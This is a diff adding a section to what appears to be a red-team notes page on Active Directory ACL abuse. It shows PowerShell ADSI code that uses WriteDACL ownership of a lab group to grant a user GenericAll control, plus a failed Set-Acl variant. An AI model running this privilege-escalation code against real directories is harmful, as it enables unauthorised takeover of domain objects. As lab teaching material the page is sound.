@@ -193,6 +193,40 @@ Below shows the user's ~~`delegate`~~ logon script field got updated in the AD:
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-08-19-13-45.png)
 
+### WriteDACL + WriteOwner
+
+If you have `WriteDACL` on an AD object you're the owner of, like I'm the owner of a `Test` AD group:
+
+![](../../.gitbook/assets/screenshot-from-2018-11-10-19-02-57.png)
+
+![](../../.gitbook/assets/screenshot-from-2018-11-10-19-07-16.png)
+
+You can now give yourself `GenericAll` privileges with ADSI sorcery:
+
+```csharp
+$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
+$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
+$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
+$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
+$ADSI.psbase.commitchanges()
+```
+
+![](../../.gitbook/assets/screenshot-from-2018-11-10-19-02-49.png)
+
+Which means you fully control the AD object now.
+
+Interesting, but I could not make it work using Active Directory module and `Set-Acl` / `Get-Acl` cmdlets:
+
+```csharp
+$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
+$acl = Get-Acl -Path $path
+$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
+$acl.AddAccessRule($ace)
+Set-Acl -Path $path -AclObject $acl
+```
+
+![](../../.gitbook/assets/screenshot-from-2018-11-10-19-09-08.png)
+
 ## References
 
 {% embed url="https://wald0.com/?p=112" %}
@@ -200,4 +234,6 @@ Below shows the user's ~~`delegate`~~ logon script field got updated in the AD:
 {% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2" %}
 
 {% embed url="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" %}
+
+{% embed url="https://adsecurity.org/?p=3658" %}
 
